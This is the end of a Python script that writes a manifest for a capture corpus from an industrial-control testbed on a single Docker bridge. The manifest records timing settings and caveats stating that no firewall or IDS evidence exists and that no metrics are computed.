        "quiet_seconds": QUIET_SECONDS,
        "event_seconds": EVENT_SECONDS,
        "sample_seconds": SAMPLE_SECONDS,
        "samples": len(rows),
        "topology_limits": (
            "grfics-v3-bridge is a single Docker bridge. There is no router between zones, so no "
            "firewall, Suricata or arpmon evidence exists on this corpus and none may be claimed "
            "from these files (ADR 0401, ADR 0402)."
        ),
        "not_a_measurement": (
            "A capture is not a score. No recall, rate, accuracy or confidence is computed here "
            "and eval_runs/log.jsonl is not appended (ADR 0402 Decision 7)."
        ),
    }
    (directory / "manifest.json").write_text(
        json.dumps(manifest, indent=2) + "\n", encoding="utf-8"
    )


if __name__ == "__main__":
    raise SystemExit(main())
